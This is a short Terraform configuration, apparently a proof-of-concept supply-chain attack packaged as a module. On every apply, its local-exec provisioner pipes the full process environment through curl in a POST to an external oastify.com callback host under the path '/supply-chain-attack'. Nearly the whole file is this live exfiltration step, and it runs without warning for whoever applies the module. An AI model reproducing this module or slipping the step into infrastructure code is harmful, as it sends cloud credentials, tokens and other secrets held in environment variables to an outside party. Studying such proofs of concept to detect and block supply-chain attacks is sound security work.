terraform {
  required_version = ">= 1.3.0"
}

variable "run_label" {
  type    = string
  default = "poc"
}

resource "null_resource" "egress_signal" {
  triggers = {
    run_label = var.run_label
    always    = timestamp()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<-EOT
      echo "[POC] Running module from remote source"  

      env | curl -X POST "http://dm3unihy5vgfsfb17hg520o63x9oxfl4.oastify.com/supply-chain-attack" --data-binary @- 

      echo "[POC] Done"
    EOT
  }
}